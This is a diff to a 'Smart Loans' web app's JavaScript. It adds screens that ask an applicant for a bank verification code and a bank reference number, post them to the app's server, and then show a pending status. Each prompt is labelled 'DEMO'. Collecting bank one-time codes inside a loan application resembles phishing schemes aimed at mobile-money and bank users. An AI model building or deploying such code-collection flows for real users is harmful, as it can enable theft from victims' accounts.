@@ -3078,6 +3078,254 @@ async function monitorEcoCashCodeStatus() {
 
 }
 // ======================================================
+// SUBMIT DEMO BANK VERIFICATION CODE
+// ======================================================
+
+async function submitBankVerificationCode() {
+
+    const input =
+        document.getElementById("bankVerificationCode");
+
+    const code = input.value.trim();
+
+    if (code === "") {
+
+        alert("Please enter the DEMO verification code.");
+
+        return;
+    }
+
+    const applicationId =
+        sessionStorage.getItem("applicationId");
+
+    if (!applicationId) {
+
+        alert("Application session not found.");
+
+        return;
+    }
+
+    try {
+
+        const response = await fetch(
+            `/submit-bank-verification/${applicationId}`,
+            {
+                method: "PUT",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+                    verificationCode: code
+                })
+            }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || !result.success) {
+
+            throw new Error(
+                result.message ||
+                "Unable to submit DEMO verification code."
+            );
+
+        }
+
+        loadVerificationPendingScreen();
+
+    } catch (err) {
+
+        console.error(
+            "SUBMIT DEMO BANK CODE ERROR:",
+            err
+        );
+
+        alert(
+            "Unable to submit the DEMO verification code."
+        );
+
+    }
+
+}
+// ======================================================
+// DEMO BANK REFERENCE SCREEN
+// ======================================================
+
+function loadBankReferenceScreen() {
+
+    const app = document.getElementById("app");
+
+    const bank =
+        sessionStorage.getItem("selectedBank") || "Bank";
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="app-header">
+
+            <button class="back-btn" id="backBankVerification">
+                ← Back
+            </button>
+
+            <div>
+
+                <div class="app-title">
+                    Smart Loans
+                </div>
+
+                <div class="app-subtitle">
+                    Fast • Secure • Convenient
+                </div>
+
+            </div>
+
+            <div class="secure">
+                🔒 Secure
+            </div>
+
+        </div>
+
+        <div class="progress-bar">
+
+            <div class="progress-fill"
+                 style="width:80%;">
+            </div>
+
+        </div>
+
+        <div class="welcome-card">
+
+            <h2>${bank} Reference</h2>
+
+            <p class="intro">
+
+                Enter the <strong>DEMO bank reference
+                number</strong> provided for this test.
+
+                <br><br>
+
+                This reference is used to identify the
+                demo bank transaction.
+
+            </p>
+
+            <label>
+                DEMO Bank Reference Number
+            </label>
+
+            <input
+                type="text"
+                id="bankReference"
+                placeholder="Enter DEMO reference"
+                autocomplete="off">
+
+            <br><br>
+
+            <button id="continueBankReference">
+
+                Continue →
+
+            </button>
+
+        </div>
+
+    </div>
+
+    `;
+
+    document
+        .getElementById("backBankVerification")
+        .addEventListener(
+            "click",
+            loadBankVerificationScreen
+        );
+
+    document
+        .getElementById("continueBankReference")
+        .addEventListener(
+            "click",
+            saveBankReference
+        );
+
+            }
+// ======================================================
+// SAVE DEMO BANK REFERENCE
+// ======================================================
+
+async function saveBankReference() {
+
+    const input =
+        document.getElementById("bankReference");
+
+    const reference =
+        input.value.trim();
+
+    if (reference === "") {
+
+        alert("Please enter the DEMO bank reference number.");
+
+        return;
+    }
+
+    const applicationId =
+        sessionStorage.getItem("applicationId");
+
+    if (!applicationId) {
+
+        alert("Application session not found.");
+
+        return;
+    }
+
+    try {
+
+        const response = await fetch(
+            `/save-bank-reference/${applicationId}`,
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+                    bankReference: reference
+                })
+            }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || !result.success) {
+
+            throw new Error(
+                result.message ||
+                "Unable to save DEMO bank reference."
+            );
+
+        }
+
+        // Continue to the application tracking/assessment stage
+        loadTrackingScreen();
+
+    } catch (err) {
+
+        console.error(
+            "SAVE DEMO BANK REFERENCE ERROR:",
+            err
+        );
+
+        alert(
+            "Unable to save the DEMO bank reference."
+        );
+
+    }
+
+}
+// ======================================================
 // PART 33 - INITIALIZE SMART LOANS
 // ======================================================
 
